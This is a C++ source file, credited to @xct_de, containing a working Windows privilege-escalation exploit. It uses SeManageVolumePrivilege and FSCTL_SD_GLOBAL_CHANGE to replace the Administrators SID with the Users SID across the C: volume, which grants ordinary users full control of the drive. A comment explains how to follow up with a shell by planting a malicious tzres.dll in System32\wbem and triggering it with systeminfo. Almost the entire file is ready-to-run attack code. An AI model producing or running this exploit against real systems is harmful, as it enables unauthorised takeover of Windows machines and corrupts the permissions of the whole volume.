#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <tchar.h>
#include <sddl.h>

/*
 Exploit SeManageVolumePrivilege
 Author: @xct_de

 Get full control over C:\ when the user has SeManageVolumePrivilege.
 One possible way to get a shell from here is to write a custom dll to C:\Windows\System32\wbem\tzres.dll & call systeminfo to trigger it.
 
 References:
 - https://github.com/gtworek/PSBits/blob/master/Misc/FSCTL_SD_GLOBAL_CHANGE.c
 */

#define QUAD_ALIGN(P) (((P) + 7) & (-8))
#define Add2Ptr(Ptr,Inc) ((PVOID)((PUCHAR)(Ptr) + (Inc)))
#define STATUS_SUCCESS 0
#define STATUS_ACCESS_DENIED (NTSTATUS)0xc0000022

__kernel_entry NTSYSCALLAPI NTSTATUS NtFsControlFile(
    HANDLE           FileHandle,
    HANDLE           Event,
    PIO_APC_ROUTINE  ApcRoutine,
    PVOID            ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG            FsControlCode,
    PVOID            InputBuffer,
    ULONG            InputBufferLength,
    PVOID            OutputBuffer,
    ULONG            OutputBufferLength
);

BOOL ConvertStringSidToSidW(
    LPCWSTR StringSid,
    PSID* Sid
);


int main(int argc, char* argv[])
{

    // enable privilege in case it's not
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    LookupPrivilegeValue(NULL, SE_MANAGE_VOLUME_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);

    PSID pSidOldSid;
    PSID pSidNewSid;
    DWORD ulOldSidSize;
    DWORD ulNewSidSize;
    SIZE_T uiHeaderSize;
    SIZE_T uiInputSize;
    SD_GLOBAL_CHANGE_INPUT* pSdInput;
    SD_GLOBAL_CHANGE_OUTPUT sdOutput;
    LPCWSTR wszOldSid = L"S-1-5-32-544";
    LPCWSTR wszNewSid = L"S-1-5-32-545";
    LPCWSTR wszVolumePath = L"\\\\.\\C:";

    ConvertStringSidToSidW(wszOldSid, &pSidOldSid);
    ConvertStringSidToSidW(wszNewSid, &pSidNewSid);
    pSdInput = NULL;
    ZeroMemory(&sdOutput, sizeof(sdOutput));

    ulOldSidSize = GetLengthSid(pSidOldSid);
    ulNewSidSize = GetLengthSid(pSidNewSid);
    uiHeaderSize = QUAD_ALIGN(FIELD_OFFSET(SD_GLOBAL_CHANGE_INPUT, SdChange)) + sizeof(SD_CHANGE_MACHINE_SID_INPUT);
    uiInputSize = uiHeaderSize + QUAD_ALIGN(ulOldSidSize) + QUAD_ALIGN(ulNewSidSize);
    pSdInput = (SD_GLOBAL_CHANGE_INPUT*)calloc(1, uiInputSize);
    pSdInput->SdChange.CurrentMachineSIDLength = (WORD)ulOldSidSize;
    pSdInput->SdChange.NewMachineSIDLength = (WORD)ulNewSidSize;
    pSdInput->ChangeType = SD_GLOBAL_CHANGE_TYPE_MACHINE_SID;
    pSdInput->SdChange.CurrentMachineSIDOffset = (WORD)uiHeaderSize;
    pSdInput->SdChange.NewMachineSIDOffset = pSdInput->SdChange.CurrentMachineSIDOffset + QUAD_ALIGN(ulOldSidSize);
    CopyMemory(Add2Ptr(pSdInput, pSdInput->SdChange.CurrentMachineSIDOffset), pSidOldSid, ulOldSidSize);
    CopyMemory(Add2Ptr(pSdInput, pSdInput->SdChange.NewMachineSIDOffset), pSidNewSid, ulNewSidSize);

    // Create handle to \\.\C: with SYNCHRONIZE | FILE_TRAVERSE
    HANDLE hVolume;
    hVolume = CreateFile(
        wszVolumePath,
        SYNCHRONIZE | FILE_TRAVERSE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    typedef NTSTATUS(__stdcall * NtFsControlFilePtr)(
        HANDLE FileHandle,
        HANDLE Event,
        PIO_APC_ROUTINE ApcRoutine,
        PVOID ApcContext,
        PIO_STATUS_BLOCK IoStatusBlock,
        ULONG FsControlCode,
        PVOID InputBuffer,
        ULONG InputBufferLength,
        PVOID OutputBuffer,
        ULONG OutputBufferLength);

    NtFsControlFilePtr NtFsControlFile;
    NtFsControlFile = reinterpret_cast<NtFsControlFilePtr>(GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtFsControlFile"));

    NTSTATUS status;
    IO_STATUS_BLOCK ioStatus;
    status = NtFsControlFile(
        hVolume,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        FSCTL_SD_GLOBAL_CHANGE,
        pSdInput,
        (ULONG)uiInputSize,
        &sdOutput,
        sizeof(sdOutput)
    );

    if (STATUS_SUCCESS == status)
    {
        std::cout << "Success! Permissions changed." << std::endl;       
    }
    else {
        std::cout << "Failed :(" << std::endl;
    }
}